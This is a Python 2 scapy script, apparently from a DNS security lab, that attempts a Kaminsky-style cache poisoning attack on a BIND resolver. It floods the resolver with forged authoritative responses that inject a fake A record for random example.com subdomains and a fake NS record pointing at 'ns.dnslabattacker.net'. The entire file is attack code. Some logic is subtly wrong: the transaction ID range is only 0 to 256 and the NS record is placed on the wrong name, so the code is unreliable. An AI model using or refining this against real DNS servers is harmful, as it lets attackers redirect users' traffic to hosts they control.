#!/usr/bin/env python2
import argparse
import socket

from scapy.all import DNS, DNSQR, DNSRR
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help= "port the BIND uses to listen to dns queries", type=int, required=False)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# BIND's ip address
dns_addr = args.ip #127.0.0.1
# BIND's port
dns_port = args.port
# port that BIND uses to send its DNS queries
my_query_port = args.query_port #2210

spoof_addr = "1.2.3.4"
spoof_ns = "ns.dnslabattacker.net"
spoof_domain = "example.com"

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    # Fixed to use dns_addr instead of my_ip
    random_subdomain = getRandomSubDomain() + ".example.com"
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=random_subdomain))
    sendPacket(sock, dnsPacket, dns_addr, dns_port)  # Corrected to use dns_addr and dns_port
    return random_subdomain, sock

def spoof_DNS(spoof_domain):
    dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Initialization of dns_sock
    for i in range(100):
        ttl_value = 86400
        dns_answer = DNSRR(rrname=spoof_domain, type='A', rdata=spoof_addr, ttl=ttl_value)
        dns_ns = DNSRR(rrname=spoof_domain, type='NS', rdata=spoof_ns, ttl=ttl_value)

        # Constructing DNS response with a random transaction ID
        dns_response = DNS(
            id=getRandomTXID(),  # Correctly setting the transaction ID
            qr=1, 
            aa=1,  
            qdcount=1,  
            ancount=1,  
            nscount=1, 
            arcount=0, 
            qd=DNSQR(qname=spoof_domain, qtype='A'), 
            an=dns_answer, 
            ns=dns_ns 
        )
        sendPacket(dns_sock, dns_response, dns_addr, my_query_port)
    dns_sock.close()

if __name__ == '__main__':
    while True:
        spoof_domain, sock = exampleSendDNSQuery()
        spoof_DNS(spoof_domain)
        response_data, _ = sock.recvfrom(4096)
        response = DNS(response_data)
        if response and response.haslayer(DNS) and response[DNS].ancount > 0:
            for i in range(response[DNS].ancount):
                if response[DNS].an[i].rdata == spoof_addr and response[DNS].ns[i].rdata == spoof_ns:
                    print("Successfully spoofed DNS response")
                    sock.close()
                    break
